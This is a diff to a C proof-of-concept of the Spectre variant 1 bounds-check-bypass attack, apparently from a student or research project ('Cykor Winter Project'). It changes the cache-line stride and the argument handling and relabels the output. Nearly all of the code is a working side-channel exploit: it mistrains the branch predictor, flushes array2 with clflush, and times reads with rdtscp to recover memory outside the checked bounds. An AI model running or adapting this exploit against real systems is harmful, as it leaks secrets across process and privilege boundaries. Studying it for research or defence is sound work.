@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <string.h>
 #ifdef _MSC_VER
 #include <intrin.h>        /* for rdtscp and clflush */
 #pragma optimize("gt",on)
@@ -8,6 +9,7 @@
 #include <x86intrin.h>     /* for rdtscp and clflush */
 #endif
 
+#define UNIT 4096
 /********************************************************************
 Victim code.
 ********************************************************************/
@@ -15,15 +17,15 @@ unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
 uint8_t unused2[64]; 
-uint8_t array2[256 * 512];
+uint8_t array2[256 * UNIT];
 
-char *secret = "The Magic Words are Squeamish Ossifrage.";
+char *secret = "Cykor Winter Project";
 
 uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */
 
 void victim_function(size_t x) {
 	if (x < array1_size) {
-		temp &= array2[array1[x] * 512];
+		temp &= array2[array1[x] * UNIT];
 	}
 }
 
@@ -41,16 +43,16 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	register uint64_t time1, time2;
 	volatile uint8_t *addr;
 
-	for (i = 0; i < 256; i++)
-		results[i] = 0;
-	for (tries = 999; tries > 0; tries--) {
+	memset(results, 0, 256);
 
-		/* Flush array2[256*(0..255)] from cache */
+	for (tries = 999; tries > 0; tries--) {
+		/* Flush array2[UNIT*(0..255)] from cache */
 		for (i = 0; i < 256; i++)
-			_mm_clflush(&array2[i * 512]);  /* intrinsic for clflush instruction */
+			_mm_clflush(&array2[i * UNIT]);  /* intrinsic for clflush instruction */
 
 		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
 		training_x = tries % array1_size;
+
 		for (j = 29; j >= 0; j--) {
 			_mm_clflush(&array1_size);
 			for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
@@ -67,11 +69,11 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
 		for (i = 0; i < 256; i++) {
-			mix_i = ((i * 167) + 13) & 255;
-			addr = &array2[mix_i * 512];
-			time1 = __rdtscp(&junk);            /* READ TIMER */
-			junk = *addr;                       /* MEMORY ACCESS TO TIME */
-			time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
+			mix_i = ((i * 167) + 13) & 255;		//Shuffle i
+			addr = &array2[mix_i * UNIT];
+			time1 = __rdtscp(&junk);            /* READ Timestamp */
+			junk = array2[mix_i * UNIT];
+			time2 = __rdtscp(&junk) - time1;    /* READ Timestamp & COMPUTE ELAPSED TIME */
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 				results[mix_i]++;  /* cache hit - add +1 to score for this value */
 		}
@@ -98,27 +100,27 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
 int main(int argc, const char **argv) {
 	size_t malicious_x=(size_t)(secret-(char*)array1);   /* default for malicious_x */
-	int i, score[2], len=40;
+	int score[2], len = strlen(secret);
 	uint8_t value[2];
 
-	for (i = 0; i < sizeof(array2); i++)
+	for (int i = 0; i < sizeof(array2); i++)
 		array2[i] = 1;    /* write to array2 so in RAM not copy-on-write zero pages */
-	if (argc == 3) {
-		sscanf(argv[1], "%p", (void**)(&malicious_x));
-		malicious_x -= (size_t)array1;  /* Convert input value into a pointer */
-		sscanf(argv[2], "%d", &len);
+
+	if (argc == 2) {
+		malicious_x = (size_t)((char*)argv[1] - (char *)array1);  /* Convert input value into a pointer */
+        len = strlen(argv[1]);
 	}
-	
+
 	printf("Reading %d bytes:\n", len);
 	while (--len >= 0) {
 		printf("Reading at malicious_x = %p... ", (void*)malicious_x);
 		readMemoryByte(malicious_x++, value, score);
-		printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
-		printf("0x%02X='%c' score=%d    ", value[0], 
-            (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+		printf("%s: ", (score[0] >= 2*score[1] ? "Gotcha!": "Hmm..?"));
+		printf("0x%02X='%c' score=%d    ", value[0],  (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
 		if (score[1] > 0)
 			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
 		printf("\n");
 	}
-	return (0);
+	
+	return 0;
 }
